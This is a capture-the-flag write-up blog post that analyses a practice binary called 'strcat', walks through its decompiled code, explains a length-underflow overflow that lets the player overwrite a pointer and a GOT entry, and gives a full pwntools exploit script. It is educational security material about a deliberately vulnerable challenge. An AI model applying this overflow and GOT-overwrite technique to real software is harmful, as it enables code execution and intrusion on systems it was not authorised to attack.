---
layout: post
current: post
cover: False # Use URL here if you want to add any image as cover
navigation: True
title: "Backdoor-Weekly-Challenge writeup - strcat"
date: 2020-04-23 12:24:00 +0530
tags: ['writeups','weekly-challenges']
class: post-template
subclass: 'post tag'
author: 'InfoSecIITR'
---

We are given a 64-bit binary with ASLR (but no PIE). Looking through the functionality of the binary, it asks us for a *name*, a *desc*(which was a malloc-ed chunk of 0x20 size) and then through a menu prompt, let's us concatenate stuff to this *name* buffer (which has a `maxlen` of `0x80` btw) and to the *desc* chunk. There is also a *win* fucntion which simply prints the flag on the screen. So, our objective is simply to call the win function.

One obvious vulnerability was a format string vulnerability in the `main` function where `printf(name)` and `printf(desc)` are used. Now, since these buffers are in the BSS and heap section, so a format string was somewhat tricky(You can try that though).

```c
ulong readline(void *param_1,int param_2)

{
  uint uVar1;
  size_t sVar2;
  
  read(0,param_1,(long)param_2);
  sVar2 = strlen(name);
  uVar1 = (int)sVar2 - 1;
  *(undefined *)((long)param_1 + (long)(int)uVar1) = 0;
  return (ulong)uVar1;
}
```
readline function disassembly using Ghidra

```c

void main(void)

{
  int iVar1;
  size_t sVar2;
  size_t sVar3;
  
  setup();
  puts("My strcat");
  maxlen = 0x80;
  printf("Name: ");
  iVar1 = readline(name,0x80);
  maxlen = maxlen - iVar1;
  desc = (char *)malloc(0x20);
  printf("Desc: ");
  readline(desc,0x20);
  do {
    while( true ) {
      print_menu();
      printf("> ");
      iVar1 = read_int32();
      if (iVar1 != 2) break;
      printf("Desc: ");
      readline(desc,0x20);
    }
    if (iVar1 == 3) {
      printf(name);
      printf(desc);
      putchar(10);
    }
    else {
      if (iVar1 == 1) {
        printf("Name: ");
        iVar1 = maxlen;
        sVar2 = strlen(name);
        sVar3 = strlen(name);
        iVar1 = readline(name + sVar3,(ulong)(uint)(iVar1 - (int)sVar2),sVar3);
        maxlen = maxlen - iVar1;
      }
      else {
        puts("Invalid");
      }
    }
  } while( true );
}

```
main function disassembly using ghidra

 Another (not so obvious) vulnerability was in the `readline` function which calculated the length of the string as `len = strlen(string)` and returned the value `len - 1` . Now in the `main` function, when we concatenate something to the *name* buffer, `maxlen` is updated to
`maxlen = maxlen - readline(name)`.
Oh, and one thing to remember, the *desc* pointer was located just **below** the *name* buffer. So, with an overflow in the buffer we could overwrite *desc* pointer and then edit this modified pointer through the menu. How do we get this overflow?



If we send `\x00` as the name, then `strlen(name)` would return `0x0` and the readline function would actually return `-1`, this would mean `maxlen = maxlen - (-1)` which effectively overflows our name buffer once, repeat this method to increase the `maxlen` buffer to say `0x90`. Now, we can simply overwrite the *desc* poiner to point it to a GOT function (I chose the `putchar@GOT` for this) and then with the help of *edit desc* option, overwrite this GOT entry to point to *win* function.


The entire exploit can then be written as:

```python
#!/usr/bin/python

from pwn import *

'''
[*]strcat'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

'''

local = False

if '-r' not in sys.argv:
    local = True

p = process('./strcat')
e = ELF('./strcat')


def init(name, desc):
    p.sendafter('Name:', name)
    p.sendafter('Desc:', desc)

def add_to_name(name):
    p.sendlineafter('>', str(1))
    p.sendafter('Name:', name)

def edit_desc(desc):
    p.sendlineafter('>', str(2))
    p.sendafter('Desc:', desc)

def viewall():
    p.sendlineafter('>', str(3))
    data = p.recvuntil('Menu',drop=True)


#Trigger the bug discussed above by sending '\x00' as the name
name_init = '\x00'
desc_init = "AAAAAAA"
init(name_init, desc_init)

# Continuosly increase maxlen to cover the desc pointer by sending null byte
for i in xrange(16):
    add_to_name('\x00')


# Finally overwriting the desc pointer with the GOT entry for putchar
payload = "A"*0x80 + '\x20\x20\x60\x20'
add_to_name(payload)

# Overwrite putchar@GOT with win function
payload = p64(e.symbols['win'])
edit_desc(payload)

# Use the print it all function in menu and you'll get the flag

p.interactive()


```
